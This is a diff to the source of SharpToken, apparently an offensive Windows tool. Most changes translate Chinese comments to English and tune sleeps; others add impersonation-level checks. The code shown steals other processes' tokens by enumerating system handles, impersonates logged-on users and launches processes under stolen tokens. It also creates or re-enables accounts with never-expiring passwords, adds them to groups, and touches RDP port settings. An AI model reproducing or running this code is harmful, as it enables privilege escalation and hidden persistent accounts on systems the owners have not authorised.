@@ -743,10 +743,10 @@ namespace SharpToken
             processToken.TargetProcessId = targetProcessPid;
             processToken.TargetProcessToken = targetProcessToken;
 
-            //获取Token类型
+            //Get Token Type
             processToken.TokenType = GetTokenType(tokenHandle);
 
-            //检查token类型是否为主Token 如果是主Token必须调用DuplicateTokenEx获取模拟Token不然就获取不到Token类型 详情:https://docs.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-token_information_class
+            //Check whether the token type is the main Token. If it is the main Token, you must call DuplicateTokenEx to obtain the simulated Token. Otherwise, you will not be able to obtain the Token type. Details: https://docs.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-token_information_class
             if (processToken.ImpersonationLevel == TokenImpersonationLevel.None)
             {
                 IntPtr newToken;
@@ -978,8 +978,8 @@ namespace SharpToken
                 return true;
             }
 
-            //CreateProcessWithTokenW的TokenHandle必须有TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID权限
-                if ( NativeMethod.CreateProcessWithTokenW(this.TokenHandle, 0, null, commandLine, dwCreationFlags, IntPtr.Zero, null, ref startupinfo,
+            //The TokenHandle of CreateProcessWithTokenW must have TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID permissions
+            if ( NativeMethod.CreateProcessWithTokenW(this.TokenHandle, 0, null, commandLine, dwCreationFlags, IntPtr.Zero, null, ref startupinfo,
                     out processInformation))
             {
                 return true;
@@ -1107,7 +1107,7 @@ namespace SharpToken
             }
             if (status != NativeMethod.STATUS_SUCCESS)
             {
-                //Console.WriteLine("NtQuerySystemInformation调用失败 ErrCode:" + Marshal.GetLastWin32Error());
+                //Console.WriteLine("NtQuerySystemInformation ErrCode:" + Marshal.GetLastWin32Error());
                 goto ret;
             }
             _SYSTEM_HANDLE_INFORMATION_EX handleInfo = (_SYSTEM_HANDLE_INFORMATION_EX)Marshal.PtrToStructure(handleInfoPtr, typeof(_SYSTEM_HANDLE_INFORMATION_EX));
@@ -1164,8 +1164,8 @@ namespace SharpToken
 
                 SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handleEntryInfo = shteis[i];
                 int handleEntryPid = (int)handleEntryInfo.ProcessID.ToInt64();
-                if (targetPid > 0 && handleEntryPid == targetPid //过滤进程PID
-                    || targetPid <= 0//如果小于等于0就不过滤
+                if (targetPid > 0 && handleEntryPid == targetPid //Filter process PID
+                    || targetPid <= 0//If less than or equal to 0 do not filter
                     )
                 {
 
@@ -1208,7 +1208,7 @@ namespace SharpToken
                         continue;
                     }
 
-                    //GrantedAccess 0x0012019f 有可能会导致堵塞
+                    //GrantedAccess 0x0012019f may cause congestion
                     if (handleEntryInfo.ObjectType != tokenType || handleEntryInfo.GrantedAccess == 0x0012019f)
                     {
                         continue;
@@ -1326,7 +1326,7 @@ namespace SharpToken
             bool hasSeAssignPrimaryTokenPrivilege = false;
             ProcessToken[] processTokens = TokenuUils.ListProcessTokens(0, token =>
             {
-                if (!hasSeAssignPrimaryTokenPrivilege && TokenuUils.tryAddTokenPriv(token.TokenHandle, "SeAssignPrimaryTokenPrivilege"))
+                if (!hasSeAssignPrimaryTokenPrivilege && token.ImpersonationLevel >= TokenImpersonationLevel.Impersonation  && TokenuUils.tryAddTokenPriv(token.TokenHandle, "SeAssignPrimaryTokenPrivilege"))
                 {
                     hasSeAssignPrimaryTokenPrivilege = token.ImpersonateLoggedOnUser();
                 }
@@ -1349,14 +1349,14 @@ namespace SharpToken
 
                     PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();
 
-                    //初始化安全属性
+                    //Initialize security properties
                     SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();
 
                     securityAttributes.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
                     securityAttributes.pSecurityDescriptor = IntPtr.Zero;
                     securityAttributes.bInheritHandle = true;
 
-                    //初始化子进程输入输出
+                    //Initialize subprocess input and output
                     if (!NativeMethod.CreatePipe(out childProcessStdInRead, out childProcessStdInWrite,
                             ref securityAttributes, 8196))
                     {
@@ -1417,6 +1417,7 @@ namespace SharpToken
                                         childProcessWriteStream.Write(convertBuf, 0, convertBuf.Length);
                                         childProcessWriteStream.Flush();
                                     }
+                                    Thread.Sleep(80);
                                 }
                             }
                             catch (Exception e)
@@ -1442,7 +1443,7 @@ namespace SharpToken
                                 consoleWriter.Write(Encoding.Default.GetChars(readBytes,0,read));
                             }
 
-                            Thread.Sleep(100);
+                            Thread.Sleep(80);
 
                         }
 
@@ -1510,7 +1511,7 @@ namespace SharpToken
             bool hasSeAssignPrimaryTokenPrivilege = false;
             ProcessToken[] processTokens = TokenuUils.ListProcessTokens(0, token =>
             {
-                if (!hasSeAssignPrimaryTokenPrivilege && TokenuUils.tryAddTokenPriv(token.TokenHandle, "SeAssignPrimaryTokenPrivilege"))
+                if (!hasSeAssignPrimaryTokenPrivilege && token.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && TokenuUils.tryAddTokenPriv(token.TokenHandle, "SeAssignPrimaryTokenPrivilege"))
                 {
                     hasSeAssignPrimaryTokenPrivilege = token.ImpersonateLoggedOnUser();
                 }
@@ -1528,14 +1529,14 @@ namespace SharpToken
 
                     PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();
 
-                    //初始化安全属性
+                    //Initialize security properties
                     SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();
 
                     securityAttributes.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
                     securityAttributes.pSecurityDescriptor = IntPtr.Zero;
                     securityAttributes.bInheritHandle = true;
 
-                    //初始化子进程输出
+                    //Initialize subprocess output
 
                     if (!NativeMethod.CreatePipe(out childProcessStdOutRead, out childProcessStdOutWrite,
                             ref securityAttributes, 8196))
@@ -1585,7 +1586,7 @@ namespace SharpToken
                                 read = childProcessReadStream.Read(readBytes, 0, readBytes.Length);
                                 consoleWriter.Write(Encoding.Default.GetChars(readBytes, 0, read));
                             }
-
+                            Thread.Sleep(80);
                         }
 
 
@@ -1632,26 +1633,26 @@ namespace SharpToken
             bool isOK = false;
             TokenuUils.ListProcessTokens(0, processToken =>
             {
-                if (processToken.UserName != "NT AUTHORITY\\ANONYMOUS LOGON" && processToken.ImpersonateLoggedOnUser())
+                if (processToken.UserName != "NT AUTHORITY\\ANONYMOUS LOGON" && processToken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && processToken.ImpersonateLoggedOnUser())
                 {
                     try
                     {
                         using (DirectoryEntry dir = new DirectoryEntry(domain))
                         {
-                            using (DirectoryEntry user = dir.Children.Add(userName, "User")) //增加用户名
+                            using (DirectoryEntry user = dir.Children.Add(userName, "User")) //add username
                             {
-                                user.Properties["FullName"].Add(userName); //用户全称
-                                user.Invoke("SetPassword", passWord); //用户密码
-                                user.Invoke("Put", "Description", userName);//用户详细描述
-                                //user.Invoke("Put","PasswordExpired",1); //用户下次登录需更改密码
-                                user.Invoke("Put", "UserFlags", 66049); //密码永不过期
-                                //user.Invoke("Put", "UserFlags", 0x0040);//用户不能更改密码s
-                                user.CommitChanges();//保存用户
+                                user.Properties["FullName"].Add(userName); //full user name
+                                user.Invoke("SetPassword", passWord); //user password
+                                user.Invoke("Put", "Description", userName);//Detailed user description
+                                //user.Invoke("Put","PasswordExpired",1); //The user needs to change the password next time he logs in
+                                user.Invoke("Put", "UserFlags", 66049); //password never expires
+                                //user.Invoke("Put", "UserFlags", 0x0040);//User cannot change password
+                                user.CommitChanges();//save user
                                 using (DirectoryEntry grp = dir.Children.Find(group, "group"))
                                 {
                                     if (grp.Name != "")
                                     {
-                                        grp.Invoke("Add", user.Path.ToString());//将用户添加到某组
+                                        grp.Invoke("Add", user.Path.ToString());//add user to a group
                                     }
                                     grp.CommitChanges();
                                 }
@@ -1690,18 +1691,18 @@ namespace SharpToken
             bool isOK = false;
             TokenuUils.ListProcessTokens(0, processToken =>
             {
-                if (processToken.UserName != "NT AUTHORITY\\ANONYMOUS LOGON" && processToken.ImpersonateLoggedOnUser())
+                if (processToken.UserName != "NT AUTHORITY\\ANONYMOUS LOGON" && processToken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && processToken.ImpersonateLoggedOnUser())
                 {
                     try
                     {
                         using (DirectoryEntry dir = new DirectoryEntry(domain))
                         {
-                            using (DirectoryEntry user = dir.Children.Find(userName, "User")) //查找用户名
+                            using (DirectoryEntry user = dir.Children.Find(userName, "User")) //find username
                             {
-                                user.Invoke("SetPassword", passWord); //用户密码
-                                user.InvokeSet("UserFlags", 66049); //密码永不过期
-                                user.InvokeSet( "AccountDisabled", false); //启用账户
-                                user.CommitChanges();//保存用户
+                                user.Invoke("SetPassword", passWord); //user password
+                                user.InvokeSet("UserFlags", 66049); //password never expires
+                                user.InvokeSet( "AccountDisabled", false); //activate account
+                                user.CommitChanges();//save user
 
                                 if (group!=null && group.Length > 0)
                                 {
@@ -1720,7 +1721,7 @@ namespace SharpToken
                                         }
                                         if (grp.Name != "" && !isExist)
                                         {
-                                            grp.Invoke("Add", user.Path.ToString());//将用户添加到某组
+                                            grp.Invoke("Add", user.Path.ToString());//add user to a group
                                         }
                                         grp.CommitChanges();
                                     }
@@ -1760,7 +1761,7 @@ namespace SharpToken
             bool isOK = false;
             TokenuUils.ListProcessTokens(0, processToken =>
             {
-                if (processToken.UserName != "NT AUTHORITY\\ANONYMOUS LOGON" && processToken.ImpersonateLoggedOnUser())
+                if (processToken.UserName != "NT AUTHORITY\\ANONYMOUS LOGON" && processToken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && processToken.ImpersonateLoggedOnUser())
                 {
                     try
                     {
@@ -1805,7 +1806,7 @@ namespace SharpToken
             int rdpPort = 3389;
             TokenuUils.ListProcessTokens(0, processToken =>
             {
-                if (processToken.UserName != "NT AUTHORITY\\ANONYMOUS LOGON" && processToken.ImpersonateLoggedOnUser())
+                if (processToken.UserName != "NT AUTHORITY\\ANONYMOUS LOGON" && processToken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && processToken.ImpersonateLoggedOnUser())
                 {
                     try
                     {
@@ -1890,7 +1891,7 @@ namespace SharpToken
                 bool isOK = false;
                 TokenuUils.ListProcessTokens(0, processToken =>
                 {
-                    if (processToken.UserName != "NT AUTHORITY\\ANONYMOUS LOGON" && processToken.ImpersonateLoggedOnUser())
+                    if (processToken.UserName != "NT AUTHORITY\\ANONYMOUS LOGON" && processToken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && processToken.ImpersonateLoggedOnUser())
                     {
                         try
                         {
